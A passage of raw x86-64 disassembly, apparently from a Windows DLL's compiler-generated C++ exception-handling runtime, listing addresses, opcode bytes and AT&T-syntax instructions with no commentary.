   18000407d:	0f 85 70 02 00 00    	jne    0x1800042f3
   180004083:	8b 43 20             	mov    0x20(%rbx),%eax
   180004086:	2d 20 05 93 19       	sub    $0x19930520,%eax
   18000408b:	83 f8 02             	cmp    $0x2,%eax
   18000408e:	0f 87 5f 02 00 00    	ja     0x1800042f3
   180004094:	83 7d f0 00          	cmpl   $0x0,-0x10(%rbp)
   180004098:	0f 86 3a 02 00 00    	jbe    0x1800042d8
   18000409e:	8b 85 00 01 00 00    	mov    0x100(%rbp),%eax
   1800040a4:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1800040a8:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1800040ac:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   1800040b0:	4c 8b ce             	mov    %rsi,%r9
   1800040b3:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1800040b8:	44 8b c7             	mov    %edi,%r8d
   1800040bb:	e8 88 ea ff ff       	call   0x180002b48
   1800040c0:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   1800040c4:	f3 0f 7f 45 88       	movdqu %xmm0,-0x78(%rbp)
   1800040c9:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1800040ce:	66 0f 7e c0          	movd   %xmm0,%eax
   1800040d2:	3b 45 c0             	cmp    -0x40(%rbp),%eax
   1800040d5:	0f 83 fd 01 00 00    	jae    0x1800042d8
   1800040db:	4c 8b 7d a8          	mov    -0x58(%rbp),%r15
   1800040df:	8b 45 90             	mov    -0x70(%rbp),%eax
   1800040e2:	4c 89 7d 80          	mov    %r15,-0x80(%rbp)
   1800040e6:	89 44 24 68          	mov    %eax,0x68(%rsp)
   1800040ea:	41 0f 10 47 18       	movups 0x18(%r15),%xmm0
   1800040ef:	66 48 0f 7e c0       	movq   %xmm0,%rax
   1800040f4:	0f 11 45 88          	movups %xmm0,-0x78(%rbp)
   1800040f8:	3b c7                	cmp    %edi,%eax
   1800040fa:	0f 8f 33 01 00 00    	jg     0x180004233
   180004100:	48 c1 e8 20          	shr    $0x20,%rax
   180004104:	3b f8                	cmp    %eax,%edi
   180004106:	0f 8f 27 01 00 00    	jg     0x180004233
   18000410c:	48 8b 46 10          	mov    0x10(%rsi),%rax
   180004110:	48 8d 55 88          	lea    -0x78(%rbp),%rdx
   180004114:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   180004118:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   18000411c:	44 8b 08             	mov    (%rax),%r9d
   18000411f:	e8 88 0a 00 00       	call   0x180004bac
   180004124:	8b 45 20             	mov    0x20(%rbp),%eax
   180004127:	45 33 e4             	xor    %r12d,%r12d
   18000412a:	44 89 64 24 64       	mov    %r12d,0x64(%rsp)
   18000412f:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   180004133:	85 c0                	test   %eax,%eax
   180004135:	0f 84 f8 00 00 00    	je     0x180004233
   18000413b:	0f 10 45 38          	movups 0x38(%rbp),%xmm0
   18000413f:	0f 10 4d 48          	movups 0x48(%rbp),%xmm1
   180004143:	0f 11 45 c8          	movups %xmm0,-0x38(%rbp)
   180004147:	f2 0f 10 45 58       	movsd  0x58(%rbp),%xmm0
   18000414c:	f2 0f 11 45 e8       	movsd  %xmm0,-0x18(%rbp)
   180004151:	0f 11 4d d8          	movups %xmm1,-0x28(%rbp)
   180004155:	e8 da ee ff ff       	call   0x180003034
   18000415a:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   18000415e:	48 83 c0 04          	add    $0x4,%rax
   180004162:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   180004166:	48 03 c2             	add    %rdx,%rax
   180004169:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   18000416e:	e8 c1 ee ff ff       	call   0x180003034
   180004173:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   180004177:	48 63 51 0c          	movslq 0xc(%rcx),%rdx
   18000417b:	44 8b 3c 10          	mov    (%rax,%rdx,1),%r15d
   18000417f:	45 85 ff             	test   %r15d,%r15d
   180004182:	7e 3a                	jle    0x1800041be
   180004184:	e8 ab ee ff ff       	call   0x180003034
   180004189:	4c 8b 43 30          	mov    0x30(%rbx),%r8
   18000418d:	4c 8b e0             	mov    %rax,%r12
   180004190:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180004195:	48 63 08             	movslq (%rax),%rcx
   180004198:	4c 03 e1             	add    %rcx,%r12
   18000419b:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   18000419f:	49 8b d4             	mov    %r12,%rdx
   1800041a2:	e8 2d 06 00 00       	call   0x1800047d4
   1800041a7:	85 c0                	test   %eax,%eax
   1800041a9:	75 30                	jne    0x1800041db
   1800041ab:	48 83 44 24 70 04    	addq   $0x4,0x70(%rsp)
   1800041b1:	41 ff cf             	dec    %r15d
   1800041b4:	45 85 ff             	test   %r15d,%r15d
   1800041b7:	7f cb                	jg     0x180004184
   1800041b9:	44 8b 64 24 64       	mov    0x64(%rsp),%r12d
   1800041be:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800041c2:	e8 e5 0d 00 00       	call   0x180004fac
   1800041c7:	41 ff c4             	inc    %r12d
   1800041ca:	44 89 64 24 64       	mov    %r12d,0x64(%rsp)
   1800041cf:	44 3b 64 24 6c       	cmp    0x6c(%rsp),%r12d
   1800041d4:	74 59                	je     0x18000422f
   1800041d6:	e9 60 ff ff ff       	jmp    0x18000413b
   1800041db:	8a 85 f8 00 00 00    	mov    0xf8(%rbp),%al
   1800041e1:	4c 8b ce             	mov    %rsi,%r9
   1800041e4:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   1800041e9:	4d 8b c5             	mov    %r13,%r8
   1800041ec:	88 44 24 58          	mov    %al,0x58(%rsp)
   1800041f0:	48 8b cb             	mov    %rbx,%rcx
   1800041f3:	8a 44 24 60          	mov    0x60(%rsp),%al
   1800041f7:	88 44 24 50          	mov    %al,0x50(%rsp)
   1800041fb:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
   1800041ff:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180004204:	8b 85 00 01 00 00    	mov    0x100(%rbp),%eax
   18000420a:	89 44 24 40          	mov    %eax,0x40(%rsp)
   18000420e:	48 8d 45 88          	lea    -0x78(%rbp),%rax
   180004212:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004217:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   18000421b:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   180004220:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004225:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   18000422a:	e8 a5 fb ff ff       	call   0x180003dd4
   18000422f:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   180004233:	4d 8b 47 08          	mov    0x8(%r15),%r8
   180004237:	48 8d 15 c2 bd ff ff 	lea    -0x423e(%rip),%rdx        # 0x180000000
   18000423e:	41 0f b6 08          	movzbl (%r8),%ecx
   180004242:	83 e1 0f             	and    $0xf,%ecx
   180004245:	48 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%rdx,1),%rax
   18000424c:	01 00 
   18000424e:	8a 8c 11 d0 03 01 00 	mov    0x103d0(%rcx,%rdx,1),%cl
   180004255:	4c 2b c0             	sub    %rax,%r8
   180004258:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   18000425c:	d3 e8                	shr    %cl,%eax
   18000425e:	4d 89 47 08          	mov    %r8,0x8(%r15)
   180004262:	41 89 47 18          	mov    %eax,0x18(%r15)
   180004266:	41 0f b6 08          	movzbl (%r8),%ecx
   18000426a:	83 e1 0f             	and    $0xf,%ecx
   18000426d:	48 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%rdx,1),%rax
   180004274:	01 00 
   180004276:	8a 8c 11 d0 03 01 00 	mov    0x103d0(%rcx,%rdx,1),%cl
   18000427d:	4c 2b c0             	sub    %rax,%r8
   180004280:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   180004284:	d3 e8                	shr    %cl,%eax
   180004286:	4d 89 47 08          	mov    %r8,0x8(%r15)
   18000428a:	41 89 47 1c          	mov    %eax,0x1c(%r15)
   18000428e:	41 0f b6 08          	movzbl (%r8),%ecx
   180004292:	83 e1 0f             	and    $0xf,%ecx
   180004295:	48 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%rdx,1),%rax
   18000429c:	01 00 
   18000429e:	8a 8c 11 d0 03 01 00 	mov    0x103d0(%rcx,%rdx,1),%cl
   1800042a5:	4c 2b c0             	sub    %rax,%r8
   1800042a8:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   1800042ac:	d3 e8                	shr    %cl,%eax
   1800042ae:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   1800042b2:	41 89 47 20          	mov    %eax,0x20(%r15)
   1800042b6:	ff c1                	inc    %ecx
   1800042b8:	4d 89 47 08          	mov    %r8,0x8(%r15)
   1800042bc:	49 8d 40 04          	lea    0x4(%r8),%rax
   1800042c0:	41 8b 10             	mov    (%r8),%edx
   1800042c3:	49 89 47 08          	mov    %rax,0x8(%r15)
   1800042c7:	41 89 57 24          	mov    %edx,0x24(%r15)
   1800042cb:	89 4c 24 68          	mov    %ecx,0x68(%rsp)
   1800042cf:	3b 4d c0             	cmp    -0x40(%rbp),%ecx
   1800042d2:	0f 82 12 fe ff ff    	jb     0x1800040ea
   1800042d8:	41 f6 06 40          	testb  $0x40,(%r14)
   1800042dc:	74 51                	je     0x18000432f
   1800042de:	49 8b d6             	mov    %r14,%rdx
   1800042e1:	48 8b ce             	mov    %rsi,%rcx
   1800042e4:	e8 ff e7 ff ff       	call   0x180002ae8
   1800042e9:	84 c0                	test   %al,%al
   1800042eb:	0f 84 94 00 00 00    	je     0x180004385
   1800042f1:	eb 3c                	jmp    0x18000432f
   1800042f3:	83 7d f0 00          	cmpl   $0x0,-0x10(%rbp)
   1800042f7:	76 36                	jbe    0x18000432f
   1800042f9:	80 bd f8 00 00 00 00 	cmpb   $0x0,0xf8(%rbp)
   180004300:	0f 85 97 00 00 00    	jne    0x18000439d
   180004306:	8b 85 00 01 00 00    	mov    0x100(%rbp),%eax
   18000430c:	4c 8b ce             	mov    %rsi,%r9
   18000430f:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   180004314:	4d 8b c5             	mov    %r13,%r8
   180004317:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000431b:	49 8b d7             	mov    %r15,%rdx
   18000431e:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180004322:	48 8b cb             	mov    %rbx,%rcx
   180004325:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   18000432a:	e8 75 00 00 00       	call   0x1800043a4
   18000432f:	e8 a0 f5 ff ff       	call   0x1800038d4
   180004334:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   180004339:	75 62                	jne    0x18000439d
   18000433b:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   18000433f:	48 33 cc             	xor    %rsp,%rcx
   180004342:	e8 79 d7 ff ff       	call   0x180001ac0
   180004347:	48 81 c4 88 01 00 00 	add    $0x188,%rsp
   18000434e:	41 5f                	pop    %r15
   180004350:	41 5e                	pop    %r14
   180004352:	41 5d                	pop    %r13
   180004354:	41 5c                	pop    %r12
   180004356:	5f                   	pop    %rdi
   180004357:	5e                   	pop    %rsi
   180004358:	5b                   	pop    %rbx
   180004359:	5d                   	pop    %rbp
   18000435a:	c3                   	ret
   18000435b:	b2 01                	mov    $0x1,%dl
   18000435d:	48 8b cb             	mov    %rbx,%rcx
   180004360:	e8 d3 ed ff ff       	call   0x180003138
   180004365:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   180004369:	e8 ce 09 00 00       	call   0x180004d3c
   18000436e:	48 8d 15 13 4d 01 00 	lea    0x14d13(%rip),%rdx        # 0x180019088
   180004375:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   180004379:	e8 a2 ef ff ff       	call   0x180003320
   18000437e:	cc                   	int3
   18000437f:	e8 1c 34 00 00       	call   0x1800077a0
   180004384:	cc                   	int3
   180004385:	e8 4a f5 ff ff       	call   0x1800038d4
   18000438a:	48 89 58 20          	mov    %rbx,0x20(%rax)
   18000438e:	e8 41 f5 ff ff       	call   0x1800038d4
   180004393:	4c 89 68 28          	mov    %r13,0x28(%rax)
   180004397:	e8 04 34 00 00       	call   0x1800077a0
   18000439c:	cc                   	int3
   18000439d:	e8 32 34 00 00       	call   0x1800077d4
   1800043a2:	cc                   	int3
   1800043a3:	cc                   	int3
   1800043a4:	40 55                	rex push %rbp
   1800043a6:	53                   	push   %rbx
   1800043a7:	56                   	push   %rsi
   1800043a8:	57                   	push   %rdi
   1800043a9:	41 54                	push   %r12
   1800043ab:	41 55                	push   %r13
   1800043ad:	41 56                	push   %r14
   1800043af:	41 57                	push   %r15
   1800043b1:	48 8d 6c 24 c8       	lea    -0x38(%rsp),%rbp
   1800043b6:	48 81 ec 38 01 00 00 	sub    $0x138,%rsp
   1800043bd:	48 8b 05 4c 5c 01 00 	mov    0x15c4c(%rip),%rax        # 0x18001a010
   1800043c4:	48 33 c4             	xor    %rsp,%rax
   1800043c7:	48 89 45 28          	mov    %rax,0x28(%rbp)
   1800043cb:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   1800043d1:	49 8b f9             	mov    %r9,%rdi
   1800043d4:	48 8b 85 b8 00 00 00 	mov    0xb8(%rbp),%rax
   1800043db:	4c 8b ea             	mov    %rdx,%r13
   1800043de:	4c 8b b5 a0 00 00 00 	mov    0xa0(%rbp),%r14
   1800043e5:	48 8b f1             	mov    %rcx,%rsi
   1800043e8:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1800043ed:	4c 89 44 24 78       	mov    %r8,0x78(%rsp)
   1800043f2:	0f 84 75 02 00 00    	je     0x18000466d
   1800043f8:	e8 d7 f4 ff ff       	call   0x1800038d4
   1800043fd:	44 8b a5 b0 00 00 00 	mov    0xb0(%rbp),%r12d
   180004404:	44 8b bd a8 00 00 00 	mov    0xa8(%rbp),%r15d
   18000440b:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   180004410:	74 5a                	je     0x18000446c
   180004412:	33 c9                	xor    %ecx,%ecx
   180004414:	ff 15 b6 bc 00 00    	call   *0xbcb6(%rip)        # 0x1800100d0
   18000441a:	48 8b d8             	mov    %rax,%rbx
   18000441d:	e8 b2 f4 ff ff       	call   0x1800038d4
   180004422:	48 39 58 10          	cmp    %rbx,0x10(%rax)
   180004426:	74 44                	je     0x18000446c
   180004428:	81 3e 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rsi)
   18000442e:	74 3c                	je     0x18000446c
   180004430:	81 3e 52 43 43 e0    	cmpl   $0xe0434352,(%rsi)
   180004436:	74 34                	je     0x18000446c
   180004438:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   18000443d:	4c 8b cf             	mov    %rdi,%r9
   180004440:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   180004445:	49 8b d5             	mov    %r13,%rdx
   180004448:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
   18000444d:	48 8b ce             	mov    %rsi,%rcx
   180004450:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004455:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   18000445a:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   18000445f:	e8 0c e5 ff ff       	call   0x180002970
   180004464:	85 c0                	test   %eax,%eax
   180004466:	0f 85 01 02 00 00    	jne    0x18000466d
   18000446c:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   180004470:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   180004474:	49 8b d6             	mov    %r14,%rdx
   180004477:	e8 ac 07 00 00       	call   0x180004c28
   18000447c:	83 7d 00 00          	cmpl   $0x0,0x0(%rbp)
   180004480:	0f 86 07 02 00 00    	jbe    0x18000468d
   180004486:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   18000448b:	48 8d 55 00          	lea    0x0(%rbp),%rdx
   18000448f:	4c 8b cf             	mov    %rdi,%r9
   180004492:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180004497:	45 8b c7             	mov    %r15d,%r8d
   18000449a:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   18000449e:	e8 a5 e6 ff ff       	call   0x180002b48
   1800044a3:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   1800044a7:	f3 0f 7f 45 80       	movdqu %xmm0,-0x80(%rbp)
   1800044ac:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1800044b1:	66 0f 7e c0          	movd   %xmm0,%eax
   1800044b5:	3b 45 a8             	cmp    -0x58(%rbp),%eax
   1800044b8:	0f 83 af 01 00 00    	jae    0x18000466d
   1800044be:	4c 8b 45 90          	mov    -0x70(%rbp),%r8
   1800044c2:	4c 8d 0d 37 bb ff ff 	lea    -0x44c9(%rip),%r9        # 0x180000000
   1800044c9:	8b 45 88             	mov    -0x78(%rbp),%eax
   1800044cc:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   1800044d1:	89 44 24 60          	mov    %eax,0x60(%rsp)
   1800044d5:	41 0f 10 40 18       	movups 0x18(%r8),%xmm0
   1800044da:	66 48 0f 7e c0       	movq   %xmm0,%rax
   1800044df:	0f 11 45 80          	movups %xmm0,-0x80(%rbp)
   1800044e3:	41 3b c7             	cmp    %r15d,%eax
   1800044e6:	0f 8f e7 00 00 00    	jg     0x1800045d3
   1800044ec:	48 c1 e8 20          	shr    $0x20,%rax
   1800044f0:	44 3b f8             	cmp    %eax,%r15d
   1800044f3:	0f 8f da 00 00 00    	jg     0x1800045d3
   1800044f9:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1800044fd:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   180004501:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   180004505:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   180004509:	44 8b 08             	mov    (%rax),%r9d
   18000450c:	e8 9b 06 00 00       	call   0x180004bac
   180004511:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   180004515:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   180004519:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   18000451d:	e8 8a 0a 00 00       	call   0x180004fac
   180004522:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   180004526:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   18000452a:	8b 5d b0             	mov    -0x50(%rbp),%ebx
   18000452d:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   180004531:	e8 76 0a 00 00       	call   0x180004fac
   180004536:	83 eb 01             	sub    $0x1,%ebx
   180004539:	74 0f                	je     0x18000454a
   18000453b:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   18000453f:	e8 68 0a 00 00       	call   0x180004fac
   180004544:	48 83 eb 01          	sub    $0x1,%rbx
   180004548:	75 f1                	jne    0x18000453b
   18000454a:	83 7d d0 00          	cmpl   $0x0,-0x30(%rbp)
   18000454e:	74 28                	je     0x180004578
   180004550:	e8 cb ea ff ff       	call   0x180003020
   180004555:	48 63 55 d0          	movslq -0x30(%rbp),%rdx
   180004559:	48 03 c2             	add    %rdx,%rax
   18000455c:	74 1a                	je     0x180004578
   18000455e:	85 d2                	test   %edx,%edx
   180004560:	74 0e                	je     0x180004570
   180004562:	e8 b9 ea ff ff       	call   0x180003020
   180004567:	48 63 4d d0          	movslq -0x30(%rbp),%rcx
   18000456b:	48 03 c1             	add    %rcx,%rax
   18000456e:	eb 02                	jmp    0x180004572
   180004570:	33 c0                	xor    %eax,%eax
   180004572:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   180004576:	75 4f                	jne    0x1800045c7
   180004578:	f6 45 cc 40          	testb  $0x40,-0x34(%rbp)
   18000457c:	75 49                	jne    0x1800045c7
   18000457e:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180004583:	4c 8b cf             	mov    %rdi,%r9
   180004586:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   18000458b:	49 8b d5             	mov    %r13,%rdx
   18000458e:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   180004593:	48 8b ce             	mov    %rsi,%rcx
   180004596:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   18000459b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800045a0:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   1800045a4:	44 89 64 24 40       	mov    %r12d,0x40(%rsp)
   1800045a9:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800045ae:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   1800045b2:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1800045b8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800045bd:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1800045c2:	e8 0d f8 ff ff       	call   0x180003dd4
   1800045c7:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1800045cc:	4c 8d 0d 2d ba ff ff 	lea    -0x45d3(%rip),%r9        # 0x180000000
   1800045d3:	49 8b 50 08          	mov    0x8(%r8),%rdx
   1800045d7:	0f b6 0a             	movzbl (%rdx),%ecx
   1800045da:	83 e1 0f             	and    $0xf,%ecx
   1800045dd:	4a 0f be 84 09 c0 03 	movsbq 0x103c0(%rcx,%r9,1),%rax
   1800045e4:	01 00 
   1800045e6:	42 8a 8c 09 d0 03 01 	mov    0x103d0(%rcx,%r9,1),%cl
   1800045ed:	00 
   1800045ee:	48 2b d0             	sub    %rax,%rdx
   1800045f1:	8b 42 fc             	mov    -0x4(%rdx),%eax
   1800045f4:	d3 e8                	shr    %cl,%eax
   1800045f6:	49 89 50 08          	mov    %rdx,0x8(%r8)
   1800045fa:	41 89 40 18          	mov    %eax,0x18(%r8)
   1800045fe:	0f b6 0a             	movzbl (%rdx),%ecx
   180004601:	83 e1 0f             	and    $0xf,%ecx
   180004604:	4a 0f be 84 09 c0 03 	movsbq 0x103c0(%rcx,%r9,1),%rax
   18000460b:	01 00 
   18000460d:	42 8a 8c 09 d0 03 01 	mov    0x103d0(%rcx,%r9,1),%cl
   180004614:	00 
   180004615:	48 2b d0             	sub    %rax,%rdx
   180004618:	8b 42 fc             	mov    -0x4(%rdx),%eax
   18000461b:	d3 e8                	shr    %cl,%eax
   18000461d:	49 89 50 08          	mov    %rdx,0x8(%r8)
   180004621:	41 89 40 1c          	mov    %eax,0x1c(%r8)
   180004625:	0f b6 0a             	movzbl (%rdx),%ecx
   180004628:	83 e1 0f             	and    $0xf,%ecx
   18000462b:	4a 0f be 84 09 c0 03 	movsbq 0x103c0(%rcx,%r9,1),%rax
   180004632:	01 00 
   180004634:	42 8a 8c 09 d0 03 01 	mov    0x103d0(%rcx,%r9,1),%cl
   18000463b:	00 
   18000463c:	48 2b d0             	sub    %rax,%rdx
   18000463f:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180004642:	d3 e8                	shr    %cl,%eax
   180004644:	41 89 40 20          	mov    %eax,0x20(%r8)
   180004648:	48 8d 42 04          	lea    0x4(%rdx),%rax
   18000464c:	49 89 50 08          	mov    %rdx,0x8(%r8)
   180004650:	8b 0a                	mov    (%rdx),%ecx
   180004652:	41 89 48 24          	mov    %ecx,0x24(%r8)
   180004656:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   18000465a:	ff c1                	inc    %ecx
   18000465c:	49 89 40 08          	mov    %rax,0x8(%r8)
   180004660:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   180004664:	3b 4d a8             	cmp    -0x58(%rbp),%ecx
   180004667:	0f 82 68 fe ff ff    	jb     0x1800044d5
   18000466d:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   180004671:	48 33 cc             	xor    %rsp,%rcx
   180004674:	e8 47 d4 ff ff       	call   0x180001ac0
   180004679:	48 81 c4 38 01 00 00 	add    $0x138,%rsp
   180004680:	41 5f                	pop    %r15
   180004682:	41 5e                	pop    %r14
   180004684:	41 5d                	pop    %r13
   180004686:	41 5c                	pop    %r12
   180004688:	5f                   	pop    %rdi
   180004689:	5e                   	pop    %rsi
   18000468a:	5b                   	pop    %rbx
   18000468b:	5d                   	pop    %rbp
   18000468c:	c3                   	ret
   18000468d:	e8 42 31 00 00       	call   0x1800077d4
   180004692:	cc                   	int3
   180004693:	cc                   	int3
   180004694:	48 8b c4             	mov    %rsp,%rax
   180004697:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000469b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000469f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800046a3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800046a7:	41 56                	push   %r14
   1800046a9:	48 83 ec 20          	sub    $0x20,%rsp
   1800046ad:	33 db                	xor    %ebx,%ebx
   1800046af:	4d 8b f0             	mov    %r8,%r14
   1800046b2:	48 8b ea             	mov    %rdx,%rbp
   1800046b5:	48 8b f9             	mov    %rcx,%rdi
   1800046b8:	39 59 04             	cmp    %ebx,0x4(%rcx)
   1800046bb:	0f 84 f0 00 00 00    	je     0x1800047b1
   1800046c1:	48 63 71 04          	movslq 0x4(%rcx),%rsi
   1800046c5:	e8 56 e9 ff ff       	call   0x180003020
   1800046ca:	4c 8b c8             	mov    %rax,%r9
   1800046cd:	4c 03 ce             	add    %rsi,%r9
   1800046d0:	0f 84 db 00 00 00    	je     0x1800047b1
   1800046d6:	85 f6                	test   %esi,%esi
   1800046d8:	74 0f                	je     0x1800046e9
   1800046da:	48 63 77 04          	movslq 0x4(%rdi),%rsi
   1800046de:	e8 3d e9 ff ff       	call   0x180003020
   1800046e3:	48 8d 0c 06          	lea    (%rsi,%rax,1),%rcx
   1800046e7:	eb 05                	jmp    0x1800046ee
   1800046e9:	48 8b cb             	mov    %rbx,%rcx
   1800046ec:	8b f3                	mov    %ebx,%esi
   1800046ee:	38 59 10             	cmp    %bl,0x10(%rcx)
   1800046f1:	0f 84 ba 00 00 00    	je     0x1800047b1
   1800046f7:	f6 07 80             	testb  $0x80,(%rdi)
   1800046fa:	74 0a                	je     0x180004706
   1800046fc:	f6 45 00 10          	testb  $0x10,0x0(%rbp)
   180004700:	0f 85 ab 00 00 00    	jne    0x1800047b1
   180004706:	85 f6                	test   %esi,%esi
   180004708:	74 11                	je     0x18000471b
   18000470a:	e8 11 e9 ff ff       	call   0x180003020
   18000470f:	48 8b f0             	mov    %rax,%rsi
   180004712:	48 63 47 04          	movslq 0x4(%rdi),%rax
   180004716:	48 03 f0             	add    %rax,%rsi
   180004719:	eb 03                	jmp    0x18000471e
   18000471b:	48 8b f3             	mov    %rbx,%rsi
   18000471e:	e8 11 e9 ff ff       	call   0x180003034
   180004723:	48 8b c8             	mov    %rax,%rcx
   180004726:	48 63 45 04          	movslq 0x4(%rbp),%rax
   18000472a:	48 03 c8             	add    %rax,%rcx
   18000472d:	48 3b f1             	cmp    %rcx,%rsi
   180004730:	74 4b                	je     0x18000477d
   180004732:	39 5f 04             	cmp    %ebx,0x4(%rdi)
   180004735:	74 11                	je     0x180004748
   180004737:	e8 e4 e8 ff ff       	call   0x180003020
   18000473c:	48 8b f0             	mov    %rax,%rsi
   18000473f:	48 63 47 04          	movslq 0x4(%rdi),%rax
   180004743:	48 03 f0             	add    %rax,%rsi
   180004746:	eb 03                	jmp    0x18000474b
   180004748:	48 8b f3             	mov    %rbx,%rsi
   18000474b:	e8 e4 e8 ff ff       	call   0x180003034
   180004750:	4c 63 45 04          	movslq 0x4(%rbp),%r8
   180004754:	49 83 c0 10          	add    $0x10,%r8
   180004758:	4c 03 c0             	add    %rax,%r8
   18000475b:	48 8d 46 10          	lea    0x10(%rsi),%rax
   18000475f:	4c 2b c0             	sub    %rax,%r8
   180004762:	0f b6 08             	movzbl (%rax),%ecx
   180004765:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   18000476a:	2b ca                	sub    %edx,%ecx
   18000476c:	75 07                	jne    0x180004775
   18000476e:	48 ff c0             	inc    %rax
   180004771:	85 d2                	test   %edx,%edx
   180004773:	75 ed                	jne    0x180004762
   180004775:	85 c9                	test   %ecx,%ecx
   180004777:	74 04                	je     0x18000477d
   180004779:	33 c0                	xor    %eax,%eax
   18000477b:	eb 39                	jmp    0x1800047b6
   18000477d:	b0 02                	mov    $0x2,%al
   18000477f:	84 45 00             	test   %al,0x0(%rbp)
   180004782:	74 05                	je     0x180004789
   180004784:	f6 07 08             	testb  $0x8,(%rdi)
   180004787:	74 24                	je     0x1800047ad
   180004789:	41 f6 06 01          	testb  $0x1,(%r14)
   18000478d:	74 05                	je     0x180004794
   18000478f:	f6 07 01             	testb  $0x1,(%rdi)
   180004792:	74 19                	je     0x1800047ad
   180004794:	41 f6 06 04          	testb  $0x4,(%r14)
   180004798:	74 05                	je     0x18000479f
   18000479a:	f6 07 04             	testb  $0x4,(%rdi)
   18000479d:	74 0e                	je     0x1800047ad
   18000479f:	41 84 06             	test   %al,(%r14)
   1800047a2:	74 04                	je     0x1800047a8
   1800047a4:	84 07                	test   %al,(%rdi)
   1800047a6:	74 05                	je     0x1800047ad
   1800047a8:	bb 01 00 00 00       	mov    $0x1,%ebx
   1800047ad:	8b c3                	mov    %ebx,%eax
   1800047af:	eb 05                	jmp    0x1800047b6
   1800047b1:	b8 01 00 00 00       	mov    $0x1,%eax
   1800047b6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800047bb:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800047c0:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
